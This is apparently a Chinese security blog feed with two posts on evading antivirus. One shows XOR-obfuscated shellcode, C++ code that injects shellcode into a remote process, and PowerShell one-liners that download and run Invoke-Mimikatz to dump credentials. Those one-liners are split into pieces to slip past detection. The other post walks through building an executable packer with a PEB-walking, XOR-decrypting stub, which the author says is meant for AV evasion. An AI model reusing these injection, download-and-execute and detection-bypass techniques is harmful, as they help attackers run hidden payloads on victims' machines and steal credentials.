class="headerlink" title="自写加载器"></a>自写加载器</h4><p>ssi源码很简单大家可以参考写一下</p><h3 id="shellcode变形"><a href="#shellcode变形" class="headerlink" title="shellcode变形"></a>shellcode变形</h3><p>大思路就是把shellcode混淆后，放入加载器加载运行。<br>其细分思路就包括怎么把shellcode进行混淆了，简单的有XOR,BASE64，复杂一点的有AES等。<br>这里就只说说xor。<br>首先我们得准备一个程序将shellcode进行混淆。图方便就拿python写也是蛮不错的。<br>随便写了一个。效果真不戳（虽然上传了vt过两天就肯定不能用了)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145855.png" alt="QQ截图20210217145855"></p><p>github:<a href="https://github.com/ConsT27/SimpleXORshellcode">https://github.com/ConsT27/SimpleXORshellcode</a></p><h3 id="shellcode注入进程内存"><a href="#shellcode注入进程内存" class="headerlink" title="shellcode注入进程内存"></a>shellcode注入进程内存</h3><h4 id="注入已有进程"><a href="#注入已有进程" class="headerlink" title="注入已有进程"></a>注入已有进程</h4><p>大致逻辑:OpenProcess获得进程句柄-&gt;VirtualAllocEx在进程中开辟一段内存空间-&gt;WriteProcessMemory向刚刚开辟的内存空间中写入shellcode-&gt;CreateRemoteThread为刚刚写入的shellcode创建一个线程执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">DWORD pid &#x3D; 25388;</span><br><span class="line">HANDLE Proc &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">if (!Proc) &#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID buffer &#x3D; VirtualAllocEx(Proc, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">if (buffer) &#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (WriteProcessMemory(Proc, buffer, buf, sizeof(buf), 0) )&#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE remotethread &#x3D; CreateRemoteThread(Proc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果:虽然也很拉，但是静态过了趋势是我没想到的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145906.png" alt="QQ截图20210217145906"></p><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><h3 id="远程执行与本地执行"><a href="#远程执行与本地执行" class="headerlink" title="远程执行与本地执行"></a>远程执行与本地执行</h3><h4 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h4><p>powershell可以加载远程的ps1文件。这样做的好处是实现了无文件落地。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure><p>不过市面上很多杀软对downloadstring检测十分十分严格(许多会检测远程文件安全性）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1 (smb)</span><br></pre></td></tr></table></figure><h4 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Import-Module .\xx.ps1</span><br></pre></td></tr></table></figure><h3 id="命令拆分"><a href="#命令拆分" class="headerlink" title="命令拆分"></a>命令拆分</h3><p>就像刚刚远程加载的downloadstring法，它很容易被杀软拦截。但是我们可以通过拆分重组绕过一些杀软检测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;$c1&#x3D;&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2&#x3D;&#39;123(&#39;&#39;http:&#x2F;&#x2F;webserver&#x2F;xxx.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前面的话:”免杀一般都是靠组合拳”&lt;/p&gt;
&lt;h2 id=&quot;EXE&quot;&gt;&lt;a href=&quot;#EXE&quot; class=&quot;headerlink&quot; title=&quot;EXE&quot;&gt;&lt;/a&gt;EXE&lt;/h2&gt;&lt;h3 id=&quot;加壳&quot;&gt;&lt;a href=&quot;#加壳&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    
    <category term="免杀" scheme="http://yoursite.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>C++结合内联汇编编写一个加壳程序</title>
    <link href="http://yoursite.com/2021/02/19/C++%E7%BB%93%E5%90%88%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F/"/>
    <id>http://yoursite.com/2021/02/19/C++%E7%BB%93%E5%90%88%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F/</id>
    <published>2021-02-19T09:21:55.758Z</published>
    <updated>2021-02-19T08:51:10.308Z</updated>
    
    <content type="html"><![CDATA[<p>参考:<a href="https://blog.csdn.net/qq_31507523/article/details/89438410">https://blog.csdn.net/qq_31507523/article/details/89438410</a></p><p>学习一下写壳，在以后免杀中使用。</p><h2 id="加壳原理"><a href="#加壳原理" class="headerlink" title="加壳原理"></a>加壳原理</h2><h3 id="手工加壳"><a href="#手工加壳" class="headerlink" title="手工加壳"></a>手工加壳</h3><p>用010editor手工加壳了解一波原理。加壳原理大致如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144840.png" alt="QQ截图20210217144840"></p><p>即我们向PE文件添加一个区段并将其设置为入口点，这样PE文件最开始执行的命令就是我们添加的区段也就是壳的指令，壳对加密区进行解密，对压缩区进行解压，将原本的EXE文件还原出来，然后跳转至原程序入口，程序照常运行。</p><p>首先生成一个打印hello的exe文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">printf(&quot;hello&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们目前要干的事情是:以手动的形式向PE文件添加一个壳部分并设为程序入口，并使其能跳转回原入口。<br>那就来吧</p><p>用010editor打开我们的exe文件，启用exe模板分析。<br>我们首先修改其文件头numverofsection属性，这个属性用来定义当前PE文件存在多少个区段,因为我们要添加一个壳区段，所以我们将其加1变成6</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144857.png" alt="QQ截图20210217144857"></p><p>在我们重载模板后我们就会在区段表发现多出来一个空的区段表</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144908.png" alt="QQ截图20210217144908"></p><p>从上到下各个比较重要字段的意思是<br>\1. Name 表示该区段的名字<br>2.VirtualSize 表示在内存中的大小(一般内存对齐为0x1000)<br>3.virtualaddress 虚拟地址 即上一个区段的VirtualAddress + 上一个区段经内存对齐粒度对齐后的大小<br>4.sizeofdata 表示在文件中的大小（一般文件对齐为0x200)<br>5.pointertorawdata 文件的偏移 即 上一个区段的PointerToRawData + 上一个区段的SizeOfRawData</p><p>然后我们通过修改以上各值来定义一个新区段（壳区段)的属性</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144928.png" alt="QQ截图20210217144928"></p><p>这里的virtualsize看着填一个就行了。<br>此时我们只是定义了区段表，但文件中并没有该区段存在，所以我们得创建该区段。<br>然后还要让区段可编辑，把下列值改为1即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144950.png" alt="QQ截图20210217144950"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145000.png" alt="QQ截图20210217145000"></p><p>ctrl+shift+i 向目标文件偏移处插入0x200大小的空间。<br>这样一来，壳区段就创建好了。 然后我们还要修改 扩展头的SizeofImage 。将他改为最后一个区段的内存地址+内存大小</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145029.png" alt="QQ截图20210217145029"></p><p>然后去掉随机基址选项。</p><p>找到扩展头的DLL属性字段，去掉随机基址，把40 81改为 00 81</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145042.png" alt="QQ截图20210217145042"></p><p>接下来我们把程序入口点设置给壳区段。<br>使用LORDPE把入口点设为壳区块的虚拟地址</p><p>然后我们用OD打开这个文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145116.png" alt="QQ截图20210217145116"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145128.png" alt="QQ截图20210217145128"></p><h3 id="真正的加壳流程"><a href="#真正的加壳流程" class="headerlink" title="真正的加壳流程"></a>真正的加壳流程</h3><p>刚刚提到的手工加壳，不过是最最基础的加壳原型而已，真正的加壳还涉及了代码加解密等操作.</p><p>真正写壳时一般写两个东西，加壳器和stub<br>所谓加壳器，就是给被加壳文件创造出一个新的区段， 在此同时将程序以某种方式加密，然后把stub放入新区段，并将程序入口点设为新区段的地址，然后在新区段结束后跳转回原程序入口。这个新区段我们叫做壳区段.<br>那么这个stub就是加壳后程序最先执行的命令了，它执行解密算法，将原程序释放出来。</p><h2 id="基于c-的壳编写"><a href="#基于c-的壳编写" class="headerlink" title="基于c++的壳编写"></a>基于c++的壳编写</h2><p>实现了一个薛定谔的加壳器（雾）<br>加壳好的程序有一定几率运行不了，原因未知。。</p><p><a href="https://github.com/ConsT27/PackingEXE/tree/master">https://github.com/ConsT27/PackingEXE/tree/master</a> 👈项目地址</p><p>很大一部分上是借鉴这个老哥的<br><a href="https://github.com/TonyChen56/GuiShou_Pack">https://github.com/TonyChen56/GuiShou_Pack</a></p><p>第一次接触汇编编程，c++编程，上来就是搞这么一个项目，搞了快两个星期，确实有点痛苦，到现在还有很大部分不是很懂的地方（比如许多数据类型以及底层汇编（笑😁<br>这个项目也存在bug，也就是刚刚说的程序有几率不能运行的问题。😡<br>但是也学到了挺多，比如PEB动态寻址，PE文件结构等等。😁<br>苦于网上没有一篇文章详细的交代了技术的细节，所以这篇文章会尽可能的详细。<br>接下来是各个流程的详细实现方法，至于怎么把各个流程链接起来，师傅们可以通过下载上面提到的两个项目来看一下。</p><h3 id="Stub"><a href="#Stub" class="headerlink" title="Stub"></a>Stub</h3><p>stub是被植入到PE文件中的代码，它一般会干下面这些事情。</p><p>流程如下</p><p>0.合并data，rdata到text<br>1.PEB动态寻址，遍历导出表找到GetProcAddress函数<br>2.解密<br>3.修改入口点到原入口点</p><p>同时stub一般以dll的形式存在。原因是DLL通常自带重定位表，这在我们的移植过程中的重定位操作中提供了巨大的便利。</p><h4 id="合并数据段"><a href="#合并数据段" class="headerlink" title="合并数据段"></a>合并数据段</h4><p>我们要移植stub过去，肯定需要移植代码段，也需要移植数据段。不如我们干脆把数据段合并到代码段，一块移植过去。</p><h4 id="PEB动态寻址-amp-导出表遍历找函数"><a href="#PEB动态寻址-amp-导出表遍历找函数" class="headerlink" title="PEB动态寻址&amp;导出表遍历找函数"></a>PEB动态寻址&amp;导出表遍历找函数</h4><p>为什么会用到这个技术编写stub？<br>因为我们的stub.dll植入到宿主程序时，只有.text植入过去，没有对应的导入表，所以我们的stub无法直接调用一些API。所以我们需要动态获取各种API。<br>其中我采用的是PEB动态查询得到GetProcAddress函数，然后用GetProcAddress函数去获取各个API。</p><p>那么，什么是PEB？<br>PEB是一个微软还未完全公开作用的一个结构，它叫做 进程环境信息块 ，包含了进程的信息。其结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">  BYTE                          Reserved1[2];</span><br><span class="line">  BYTE                          BeingDebugged; &#x2F;&#x2F;被调试状态</span><br><span class="line">  BYTE                          Reserved2[1];</span><br><span class="line">  PVOID                         Reserved3[2];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr;</span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  BYTE                          Reserved4[104];</span><br><span class="line">  PVOID                         Reserved5[52];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved6[128];</span><br><span class="line">  PVOID                         Reserved7[1];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>我们关心的是PEB偏移0c得到的 PPEB_LDR_DATA Ldr; 它是一个指针，指向一个 PPEB_LDR_DATA 结构， 存放着已经被进程装在的动态链接库的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB_LDR_DATA</span><br><span class="line">&#123;</span><br><span class="line">　ULONG Length; &#x2F;&#x2F; +0x00</span><br><span class="line">　BOOLEAN Initialized; &#x2F;&#x2F; +0x04</span><br><span class="line">　PVOID SsHandle; &#x2F;&#x2F; +0x08</span><br><span class="line">　LIST_ENTRY InLoadOrderModuleList; &#x2F;&#x2F; +0x0c</span><br><span class="line">　LIST_ENTRY InMemoryOrderModuleList; &#x2F;&#x2F; +0x14</span><br><span class="line">　LIST_ENTRY InInitializationOrderModuleList;&#x2F;&#x2F; +0x1c</span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; &#x2F;&#x2F; +0x24</span><br></pre></td></tr></table></figure><p>PPEB_LDR_DATA 偏移1c是一个指向LIST_ENTRY InInitializationOrderModuleList结构的指针，这个结构 存放着指向模块初始化链表的头 ， 按顺序存放着PE装入运行时初始化模块信息，一般来说第一个链表结点是ntdll.dll,第二个链表结点就是kernel32.dll 。我们就在其中找到kernel32.dll的信息，获取其PE信息，得到导出表，循环遍历得到GetProcAddress函数。<br>另外，PEB地址再TEB偏移0x30处。用汇编语言表示就是 fs:[0x30]。</p><p>以上是PEB寻址的大致流程，另外还有一个比较关键的点是遍历kernel32.dll导出表获得GetProcAddress函数信息。<br>关于导出表可以看看这个文章<a href="https://blog.csdn.net/evileagle/article/details/12176797">https://blog.csdn.net/evileagle/article/details/12176797</a></p><p>首先一个导出表结构体如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;  &#x2F;&#x2F;一般为0，没啥用</span><br><span class="line">    DWORD   TimeDateStamp;  &#x2F;&#x2F;导出表生成的时间</span><br><span class="line">    WORD    MajorVersion;  &#x2F;&#x2F;版本，也是0没啥用</span><br><span class="line">    WORD    MinorVersion;  &#x2F;&#x2F;也是没啥用的版本信息一般为0</span><br><span class="line">    DWORD   Name;  &#x2F;&#x2F;当前导出表的模块名字</span><br><span class="line">    DWORD   Base;  &#x2F;&#x2F;序号表中序号的基数</span><br><span class="line">    DWORD   NumberOfFunctions;  &#x2F;&#x2F;导出函数数量</span><br><span class="line">    DWORD   NumberOfNames;  &#x2F;&#x2F;按名字导出函数的数量</span><br><span class="line">    DWORD   AddressOfFunctions;     &#x2F;&#x2F; 序号表</span><br><span class="line">    DWORD   AddressOfNames;         &#x2F;&#x2F; 名称表</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  &#x2F;&#x2F; 地址表</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>其中序号表的起始序号是Base属性定义的值。以下是导出表的序号名称地址表的关系</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145159.png" alt="QQ截图20210217145159"></p><p>我们的遍历流程是，先遍历名称表找到GetProcAddress在名称数组中的下标，然后根据这个下标去序号数组中找相同下标的序号值，然后以这个序号值为下标去找地址数组中的对应值。我们找到的地址表中的值就是函数入口</p><p>下面我把这段程序的汇编代码放出来。我是用内联汇编把这段代码塞进C++的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">void GetApis()</span><br><span class="line">&#123;</span><br><span class="line">HMODULE hKernel32;</span><br><span class="line"></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">pushad;</span><br><span class="line">; &#x2F;&#x2F;获取kernel32.dll的加载基址;</span><br><span class="line">mov eax, fs: [0x30] ;  &#x2F;&#x2F;得到PEB地址</span><br><span class="line">mov eax, [eax + 0ch];  &#x2F;&#x2F;获得LDR_PEB_DATA地址</span><br><span class="line">mov eax, [eax + 0ch];  &#x2F;&#x2F;获得LIST_ENTRY InLoadOrderModuleList;地址</span><br><span class="line">mov eax, [eax];  &#x2F;&#x2F;获得LIST_ENTRY InLoadOrderModuleList下一项的地址</span><br><span class="line">mov eax, [eax];  &#x2F;获得LIST_ENTRY InLoadOrderModuleList下下项即我们需要的LIST_ENTRY InInitializationOrderModuleList的地址</span><br><span class="line">mov eax, [eax + 018h]; &#x2F;&#x2F;获得kernel32.dll地址</span><br><span class="line">mov hKernel32, eax;</span><br><span class="line">mov ebx, [eax + 03ch];&#x2F;&#x2F;获得kernel32.dll NT头RVA</span><br><span class="line">add ebx, eax; &#x2F;&#x2F;NT头的VA</span><br><span class="line">add ebx, 078h; &#x2F;&#x2F;获得区段表</span><br><span class="line">mov ebx, [ebx]; &#x2F;&#x2F;获得导出表RVA</span><br><span class="line">add ebx, eax;  &#x2F;&#x2F;导出表VA</span><br><span class="line">lea ecx, [ebx + 020h];  </span><br><span class="line">mov ecx, [ecx]; &#x2F;&#x2F; ecx &#x3D;&gt; 名称表的首地址(rva);</span><br><span class="line">add ecx, eax; &#x2F;&#x2F; ecx &#x3D;&gt; 名称表的首地址(va);</span><br><span class="line">xor edx, edx; &#x2F;&#x2F; 作为索引(index)来使用.</span><br><span class="line">_WHILE:;</span><br><span class="line">mov esi, [ecx + edx * 4];&#x2F;&#x2F;名称数组入口点rva，名称数组单位大小4字节</span><br><span class="line">lea esi, [esi + eax];  &#x2F;&#x2F;入口点VA</span><br><span class="line">cmp dword ptr[esi], 050746547h;   &#x2F;&#x2F;进行名称匹配，050746547h即小端存储的GetP</span><br><span class="line">jne _LOOP;&#x2F;&#x2F;不相等就跳入_LOOP段</span><br><span class="line">cmp dword ptr[esi + 4], 041636f72h; &#x2F;&#x2F;名陈匹配，rocA，以下依次为ddre，ss</span><br><span class="line">jne _LOOP;</span><br><span class="line">cmp dword ptr[esi + 8], 065726464h;</span><br><span class="line">jne _LOOP;</span><br><span class="line">cmp word  ptr[esi + 0ch], 07373h;</span><br><span class="line">jne _LOOP;</span><br><span class="line">mov edi, [ebx + 024h]; </span><br><span class="line">add edi, eax;  &#x2F;&#x2F;获得序号表VA</span><br><span class="line"></span><br><span class="line">mov di, [edi + edx * 2];  &#x2F;&#x2F;获得序号数组中对应下标的地址，序号数组单位大小2字节</span><br><span class="line">and edi, 0FFFFh;  &#x2F;&#x2F;给di提位到32位，即给予edi 序号表中对应下标的地址</span><br><span class="line">mov edx, [ebx + 01ch];  </span><br><span class="line">add edx, eax;  &#x2F;&#x2F;获得地址表</span><br><span class="line">mov edi, [edx + edi * 4];  &#x2F;&#x2F;获得地址数组中，序号对应的值，地址数组单位大小4字节</span><br><span class="line">add edi, eax;   &#x2F;&#x2F;获得GetProcAddress的入口地址</span><br><span class="line">mov MyGetProcAddress, edi;  &#x2F;&#x2F;赋值</span><br><span class="line">jmp _ENDWHILE;  &#x2F;&#x2F;END</span><br><span class="line">_LOOP:;</span><br><span class="line">inc edx; &#x2F;&#x2F; ++index;</span><br><span class="line">jmp _WHILE;</span><br><span class="line">_ENDWHILE:;</span><br><span class="line">popad;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>解密代码段。这段好写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void Decrypt()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char* pText &#x3D; (unsigned char*)g_conf.textScnRVA + 0x400000;&#x2F;&#x2F;锁定到PE文件的text段（因为加壳时去掉了基址随机化，所以自信的把基址填成0x400000</span><br><span class="line"></span><br><span class="line">DWORD old &#x3D; 0;</span><br><span class="line">MyVirtualProtect(pText, g_conf.textScnSize, PAGE_READWRITE, &amp;old);&#x2F;&#x2F;修改代码段的属性,注意我们这里使用了动态获得的</span><br><span class="line">&#x2F;&#x2F;解密代码段</span><br><span class="line">for (DWORD i &#x3D; 0; i &lt; g_conf.textScnSize; i++)</span><br><span class="line">&#123;</span><br><span class="line">pText[i] ^&#x3D; g_conf.key;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;把属性修改回去</span><br><span class="line">MyVirtualProtect(pText, g_conf.textScnSize, old, &amp;old);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="修改入口点"><a href="#修改入口点" class="headerlink" title="修改入口点"></a>修改入口点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, g_conf.srcOep;  &#x2F;&#x2F;入口点是g_conf.srcOep</span><br><span class="line">add eax, 0x400000</span><br><span class="line">jmp eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="加壳器"><a href="#加壳器" class="headerlink" title="加壳器"></a>加壳器</h3><p>加壳器流程如下</p><p>1.打开需要被加壳的PE文件<br>2.加载stub<br>3.加密代码段<br>4.添加新区段<br>5.stub重定位修复<br>6.stub移植<br>7.PE文件入口点修改<br>8.去随机基址<br>9.保存文件</p><p>以下的各个流程描述中会用到诸多自定义函数，我先贴上来吧。</p><h4 id="诸多自定函数-amp-结构体"><a href="#诸多自定函数-amp-结构体" class="headerlink" title="诸多自定函数&amp;结构体"></a>诸多自定函数&amp;结构体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;****************</span><br><span class="line">&#x2F;&#x2F;对齐处理</span><br><span class="line">&#x2F;&#x2F;time:2020&#x2F;11&#x2F;5</span><br><span class="line">&#x2F;&#x2F;****************</span><br><span class="line">int AlignMent(_In_ int size, _In_ int alignment) &#123;</span><br><span class="line">return (size) % (alignment)&#x3D;&#x3D;0 ? (size) : ((size) &#x2F; alignment+1) * (alignment);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;***********************</span><br><span class="line">&#x2F;&#x2F;PE信息获取函数簇</span><br><span class="line">&#x2F;&#x2F;time:2020&#x2F;11&#x2F;2</span><br><span class="line">&#x2F;&#x2F;***********************</span><br><span class="line">PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) &#123;</span><br><span class="line">return PIMAGE_DOS_HEADER(pBase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) &#123;</span><br><span class="line">return PIMAGE_NT_HEADERS(GetDosHeader(pBase)-&gt;e_lfanew+(SIZE_T)pBase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) &#123;</span><br><span class="line">return &amp;(GetNtHeader(pBase)-&gt;FileHeader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) &#123;</span><br><span class="line">return &amp;(GetNtHeader(pBase)-&gt;OptionalHeader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER GetLastSec(_In_ char* pBase) &#123;</span><br><span class="line">DWORD SecNum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER 